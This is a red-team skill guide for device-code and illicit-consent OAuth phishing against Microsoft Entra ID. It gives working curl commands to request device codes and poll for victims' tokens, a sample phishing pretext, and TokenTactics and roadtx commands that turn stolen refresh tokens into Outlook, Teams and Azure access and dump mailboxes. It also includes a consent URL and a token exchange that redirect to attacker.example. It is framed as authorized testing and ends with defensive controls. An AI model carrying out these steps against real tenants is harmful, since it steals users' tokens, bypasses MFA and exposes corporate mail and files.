---
name: attacking-oauth-with-device-code-phishing
description: Run OAuth 2.0 device-code and illicit-consent phishing attacks against Microsoft Entra ID, using TokenTactics-style tooling to steal access and refresh tokens, bypass MFA, and pivot across Microsoft 365 services. Use for authorized red-team engagements simulating device-code or consent-grant phishing against a tenant you have explicit written permission to test. Do not use for defensive detection of malicious OAuth consent grants - use detecting-suspicious-oauth-application-consent.
domain: cybersecurity
subdomain: identity-access-management
tags:
- device-code-phishing
- oauth
- entra-id
- token-theft
- mfa-bypass
- illicit-consent
- tokentactics
- red-team
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-03
mitre_attack:
- T1528
---
# Attacking OAuth with Device-Code Phishing

> **Legal Notice:** This skill is for authorized security testing, red-team engagements, and educational purposes only. Device-code and consent-grant phishing manipulate real users into authorizing attacker-controlled access to corporate identities. Execute only against tenants you own or have explicit written authorization (rules of engagement) to test. Unauthorized use violates the Computer Fraud and Abuse Act and equivalent laws worldwide.

## Overview

The OAuth 2.0 Device Authorization Grant (RFC 8628) was designed for input-constrained devices (smart TVs, CLI tools) that cannot easily present a browser-based login. A device requests a short `user_code` and a `device_code`, displays the `user_code` and a verification URL to the user, and polls the token endpoint while the user authenticates on a separate, fully-featured device. Attackers weaponize this flow: instead of a smart TV, the "device" is the attacker's machine. The attacker initiates the device-code request, then phishes a victim to visit the legitimate Microsoft verification page (`https://microsoft.com/devicelogin`) and enter the attacker-generated `user_code`. Because the victim authenticates on the genuine Microsoft login page — completing MFA — the resulting tokens are minted to the attacker's polling session. This bypasses MFA entirely: the second factor is satisfied by the victim, but the bearer tokens land with the attacker (mapped to MITRE ATT&CK **T1528 – Steal Application Access Token**).

Microsoft Threat Intelligence, Volexity, and Proofpoint documented sharp growth in device-code phishing through 2025, with Russia-aligned actors (tracked by Microsoft as Storm-2372) among the most prolific. Mandiant's M-Trends reporting similarly highlights OAuth token theft as a leading cloud initial-access vector. A closely related technique is the **illicit consent grant** ("OAuth phishing"): the attacker registers a multi-tenant app and tricks the victim into clicking an `/adminconsent` or user-consent URL, granting the malicious app delegated Microsoft Graph permissions (Mail.Read, Files.ReadWrite.All, offline_access) that persist independently of password resets. This skill covers both, plus token replay across Microsoft 365 services using TokenTactics and validation/access mapping with ROADtools.

The defining property red teams exploit: access tokens minted via the device-code flow are valid for roughly 60–90 minutes, but the accompanying refresh token (with `offline_access` scope) survives for up to 90 days and can be redeemed for fresh tokens against any first-party resource the client is allowed to request — Outlook, SharePoint, Teams, Azure Resource Manager — enabling durable, MFA-surviving access.

## When to Use

- During an authorized red-team or assumed-breach engagement targeting Microsoft 365 / Entra ID where social-engineering is in scope
- When validating Conditional Access policies, MFA enforcement, and token-protection controls against real phishing techniques
- When testing whether an organization restricts the OAuth device-code flow or blocks unverified multi-tenant app consent
- When demonstrating MFA-bypass risk to justify phishing-resistant authentication (FIDO2) and token-binding controls
- When building detections (paired with the blue-team `hunting-saas-sso-token-abuse` skill) and you need realistic telemetry

## Prerequisites

- Written authorization / rules of engagement explicitly permitting phishing and token theft against the target tenant
- A controlled pretext-delivery channel (sanctioned phishing infrastructure or an internal test mailbox)
- Linux or Windows attacker host with Python 3.8+ and PowerShell 7+
- TokenTactics (PowerShell) and ROADtools (Python) installed:
  ```bash
  # ROADtools (roadrecon + roadtx) — Dirk-jan Mollema / Outsider Security
  pip install roadtools roadtools_auth
  # roadtx (ROADtools Token eXchange) ships in roadtools_auth
  roadtx --help

  # TokenTactics v2 (rvrsh3ll)
  git clone https://github.com/rvrsh3ll/TokenTactics.git
  pwsh -c "Import-Module ./TokenTactics/TokenTactics.psd1"
  ```
- Familiarity with OAuth 2.0 grant types, JWT structure, and Microsoft Graph scopes

## Objectives

- Initiate an OAuth device-code request against Entra ID using a first-party client ID
- Deliver a credible pretext that drives the victim to the genuine Microsoft device-login page
- Poll the token endpoint and capture the victim's access and refresh tokens
- Refresh tokens across Microsoft 365 resources (Graph, Outlook, Azure management) to expand access
- Execute the illicit-consent variant by registering and phishing consent for a malicious multi-tenant app
- Enumerate accessible resources and data with ROADtools to demonstrate impact
- Document MFA bypass and produce remediation recommendations

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1528 | Steal Application Access Token | Phishing the device-code flow / consent grant yields attacker-controlled OAuth access and refresh tokens that are reused to access cloud services without re-authenticating |

Related techniques frequently chained: **T1566** Phishing (delivery), **T1550.001** Application Access Token (replaying stolen tokens), **T1098.003** Account Manipulation: Additional Cloud Roles (consent grant persistence).

## Workflow

### Phase 1: Initiate the Device-Code Request

The attacker requests a device code from Entra ID, choosing a first-party client that the victim implicitly trusts. The Microsoft Office client ID `d3590ed6-52b3-4102-aeff-aad2292ab01c` is commonly used because it is pre-authorized for broad first-party resources.

1. Request a device code directly via the token endpoint:
   ```bash
   # client_id = Microsoft Office; scope requests offline_access for a long-lived refresh token
   curl -s -X POST \
     'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode' \
     -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
     -d 'scope=https://graph.microsoft.com/.default offline_access' | tee devicecode.json
   ```
2. The JSON response contains the fields you weaponize:
   ```json
   {
     "user_code": "B7HVQXKZ2",
     "device_code": "GMMhmHCXhWEzkobqIHGG_EnNYYsAkukHspeYUk9E8...",
     "verification_uri": "https://microsoft.com/devicelogin",
     "expires_in": 900,
     "interval": 5,
     "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code B7HVQXKZ2 to authenticate."
   }
   ```
3. Note the 15-minute (`expires_in: 900`) validity window — the pretext must drive the victim to authenticate quickly.

   Equivalent using TokenTactics (handles polling automatically):
   ```powershell
   Import-Module ./TokenTactics/TokenTactics.psd1
   # Generates a device code and begins polling; prints the user_code to phish
   Get-AzureToken -Client MSGraph
   ```

### Phase 2: Deliver the Pretext

The phishing message must NOT contain a credential-harvesting link — the victim authenticates on the real Microsoft page, which is what defeats user suspicion and MFA.

1. Craft a pretext that references the genuine `https://microsoft.com/devicelogin` URL and the `user_code` (e.g., "IT is enrolling your account in the new Teams Rooms device; open microsoft.com/devicelogin and enter code B7HVQXKZ2 within 15 minutes").
2. Send through sanctioned phishing infrastructure. Hyperlinked codes/URLs frequently land in spam, so present the URL and code as plain text.
3. Time delivery to the start of a polling cycle so the code is fresh.

### Phase 3: Poll and Capture Tokens

While the victim authenticates and approves, poll the token endpoint with the `device_code` until tokens are issued.

1. Poll at the server-specified `interval` (5 seconds); `authorization_pending` is expected until the victim completes sign-in:
   ```bash
   DEVICE_CODE=$(python -c "import json;print(json.load(open('devicecode.json'))['device_code'])")
   while true; do
     RESP=$(curl -s -X POST \
       'https://login.microsoftonline.com/organizations/oauth2/v2.0/token' \
       -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
       -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
       -d "device_code=${DEVICE_CODE}")
     echo "$RESP" | grep -q access_token && { echo "$RESP" > tokens.json; break; }
     echo "$RESP" | grep -q authorization_pending || echo "$RESP"
     sleep 5
   done
   ```
2. On success the response yields `access_token`, `refresh_token`, `id_token`, `expires_in`, and the granted `scope`.
3. Decode the access token to confirm the captured identity, audience, and scopes:
   ```bash
   python -c "import json,base64;p=json.load(open('tokens.json'))['access_token'].split('.')[1];print(json.loads(base64.urlsafe_b64decode(p+'=='*(-len(p)%4))))"
   ```

### Phase 4: Refresh Across Microsoft 365 Resources

The refresh token (with `offline_access`) can be redeemed for tokens scoped to other first-party resources, expanding access beyond the original scope.

1. Use TokenTactics refresh functions to pivot the refresh token to specific services:
   ```powershell
   # $response holds the device-code result from Get-AzureToken
   $rt = $response.refresh_token
   Invoke-RefreshToOutlookToken          -domain target.com -refreshToken $rt   # mailbox access
   Invoke-RefreshToMSGraphToken          -domain target.com -refreshToken $rt   # Graph
   Invoke-RefreshToMSTeamsToken          -domain target.com -refreshToken $rt   # Teams
   Invoke-RefreshToAzureCoreManagementToken -domain target.com -refreshToken $rt # ARM
   Invoke-RefreshToSubstrateToken        -domain target.com -refreshToken $rt
   ```
2. Equivalently with roadtx, redeem the refresh token for a new resource:
   ```bash
   roadtx refreshtokento \
     -r "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
     -s https://graph.microsoft.com/.default
   ```
3. Demonstrate mailbox access to prove impact (read-only, scoped to engagement rules):
   ```powershell
   Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder Inbox
   ```

### Phase 5: Illicit Consent Grant Variant

Instead of device-code, register a malicious multi-tenant app and phish the victim to consent to delegated Graph permissions for durable, password-reset-surviving access.

1. Register a multi-tenant app in an attacker tenant requesting delegated scopes such as `Mail.Read`, `Files.ReadWrite.All`, `offline_access`.
2. Build a user-consent URL and phish it:
   ```text
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=<ATTACKER_APP_ID>
     &response_type=code
     &redirect_uri=https://attacker.example/callback
     &response_mode=query
     &scope=offline_access%20Mail.Read%20Files.ReadWrite.All
     &state=12345
   ```
3. When the victim consents, exchange the returned `code` for tokens:
   ```bash
   curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
     -d 'client_id=<ATTACKER_APP_ID>' \
     -d 'grant_type=authorization_code' \
     -d 'code=<AUTH_CODE>' \
     -d 'redirect_uri=https://attacker.example/callback' \
     -d 'client_secret=<APP_SECRET>' \
     -d 'scope=offline_access Mail.Read Files.ReadWrite.All'
   ```
4. The consented OAuth grant persists as a service-principal grant in the victim tenant until an admin revokes it (`Remove-MgServicePrincipalOauth2PermissionGrant`).

### Phase 6: Enumerate Impact with ROADtools

1. Authenticate roadrecon with the captured token / refresh token and dump the directory:
   ```bash
   roadrecon auth --refresh-token "$(python -c "import json;print(json.load(open('tokens.json'))['refresh_token'])")" \
     -c d3590ed6-52b3-4102-aeff-aad2292ab01c
   roadrecon gather
   roadrecon gui   # browse users, groups, app registrations, role assignments
   ```
2. Identify high-value access: role assignments, owned applications, accessible SharePoint sites, and additional consent grants.
3. Record exactly what data and roles the stolen tokens reached for the engagement report.

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| TokenTactics v2 | Generate device codes and refresh tokens across M365 services | https://github.com/rvrsh3ll/TokenTactics |
| ROADtools (roadrecon / roadtx) | Token exchange, directory enumeration, access mapping | https://github.com/dirkjanm/ROADtools |
| AADInternals | Entra ID attack/recon PowerShell toolkit | https://github.com/Gerenios/AADInternals |
| RFC 8628 | OAuth 2.0 Device Authorization Grant specification | https://datatracker.ietf.org/doc/html/rfc8628 |
| Microsoft / Storm-2372 advisory | Device-code phishing campaign analysis | https://www.microsoft.com/en-us/security/blog/ |
| Mandiant M-Trends | OAuth token theft trend reporting | https://cloud.google.com/security/resources/m-trends |

## Defensive Recommendations

| Control | Effect |
|---------|--------|
| Conditional Access policy blocking the device-code flow (`authenticationFlows`) for users who do not need it | Removes the attack surface for most users |
| Phishing-resistant MFA (FIDO2 / passkeys) + token protection (token binding) | Bound tokens cannot be replayed off the victim device |
| Restrict user consent to verified publishers / require admin consent | Blocks illicit-consent grants |
| Sign-in frequency + shorter session lifetimes on untrusted networks | Limits refresh-token longevity |
| Monitor `AADNonInteractiveUserSignInLogs` for device-code grants and anomalous token use | Detection (see `hunting-saas-sso-token-abuse`) |

## Validation Criteria

- [ ] Device-code request returned a valid `user_code` and `device_code`
- [ ] Pretext delivered referencing the genuine Microsoft device-login page (no harvesting link)
- [ ] Token endpoint polled and `access_token` + `refresh_token` captured
- [ ] Access token decoded to confirm captured identity, audience, and scopes
- [ ] Refresh token successfully exchanged for at least one additional M365 resource
- [ ] MFA bypass demonstrated (victim completed MFA; attacker holds usable tokens)
- [ ] Illicit-consent variant tested or documented as out of scope
- [ ] Accessible resources enumerated with ROADtools and recorded
- [ ] Remediation recommendations (CA device-code block, FIDO2, consent restrictions) delivered
